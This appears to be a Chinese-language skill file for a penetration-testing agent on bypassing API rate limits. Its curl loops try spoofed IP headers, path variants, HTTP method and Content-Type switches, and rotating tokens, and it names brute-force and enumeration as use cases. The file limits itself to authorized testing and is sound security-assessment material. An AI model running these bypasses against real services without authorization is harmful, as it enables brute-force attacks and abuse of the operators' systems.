---
name: api-rate-limit-bypass
description: 检测和绕过 API 速率限制，通过 HTTP 头操纵、路径变体和参数污染绕过节流控制。
category: api
source: xalgorix
tags:
  - 速率限制
  - API 安全
  - 绕过
  - OWASP API4:2023
required_tools:
  - curl
---

# API 速率限制绕过

## 适用场景

- 目标 API 实施了速率限制（返回 429 Too Many Requests）。
- 需要测试限速机制是否可被绕过。
- 暴力破解或枚举测试中需要绕过节流控制。

## 授权边界

- 速率限制绕过仅用于验证防御缺陷，不用于大规模数据爬取或 DoS。
- 测试速率控制在不影响服务可用性的范围内。

## 前置条件

- 已发现受速率限制的 API 端点。
- 能够触发 429 响应以建立基线。

## 执行步骤

### 步骤 1：建立基线

```bash
# 快速发送请求，找到限速阈值
for i in $(seq 1 200); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://<target>/api/endpoint")
  [ "$code" = "429" ] && echo "Rate limit at request $i" && break
done
```

### 步骤 2：IP 欺骗头绕过

```bash
# 尝试 17 种常见 IP 头
HEADERS=(
  "X-Forwarded-For: 127.0.0.$RANDOM"
  "X-Real-IP: 10.0.0.$RANDOM"
  "X-Originating-IP: 172.16.0.$RANDOM"
  "X-Client-IP: 192.168.0.$RANDOM"
  "X-Remote-IP: 10.0.0.$RANDOM"
  "CF-Connecting-IP: 1.2.3.$RANDOM"
  "X-Azure-ClientIP: 10.0.0.$RANDOM"
  "True-Client-IP: 172.16.0.$RANDOM"
)

for header in "${HEADERS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://<target>/api/endpoint" -H "$header")
  [ "$code" != "429" ] && echo "Bypass with: $header"
done
```

### 步骤 3：端点变体绕过

```bash
# 12 种路径变体
PATHS=(
  "/api/endpoint"
  "/api/endpoint/"
  "/api//endpoint"
  "/api/./endpoint"
  "/API/endpoint"
  "/api/Endpoint"
  "/api/v1/endpoint"
  "/api/v2/endpoint"
  "/api/endpoint.json"
  "/api/endpoint.php"
  "/api/endpoint?param="
  "/api/endpoint#"
)

for path in "${PATHS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://<target>$path")
  [ "$code" != "429" ] && echo "Bypass with path: $path"
done
```

### 步骤 4：HTTP 方法与 Content-Type 绕过

```bash
# 方法切换
for method in GET POST PUT HEAD OPTIONS; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" "https://<target>/api/endpoint")
  [ "$code" != "429" ] && echo "Bypass with method: $method"
done

# Content-Type 变体
for ct in "application/json" "text/plain" "application/xml" "multipart/form-data"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://<target>/api/endpoint" -H "Content-Type: $ct")
  [ "$code" != "429" ] && echo "Bypass with Content-Type: $ct"
done
```

### 步骤 5：账户级绕过

```bash
# 如果有多个测试账号，轮流使用不同 Token
# 如果限速是基于 IP 而非 Token，多 Token 可绕过
TOKENS=("<token1>" "<token2>" "<token3>")
for token in "${TOKENS[@]}"; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    "https://<target>/api/endpoint" \
    -H "Authorization: Bearer $token"
done
```

## 停止条件

- 找到可用绕过方法后，仅验证一次即记录。
- 不利用绕过进行高频请求或数据爬取。

## 输出格式

- 基线限速阈值。
- 有效的绕过方法（头/路径/方法/多账号）。
- 限速机制评估（基于 IP / Token / 其他）。
- 受影响端点。

## 验收标准

1. 建立了准确的限速基线。
2. 测试了至少 5 种 IP 欺骗头。
3. 测试了至少 5 种路径变体。
4. 测试了 HTTP 方法和 Content-Type 绕过。
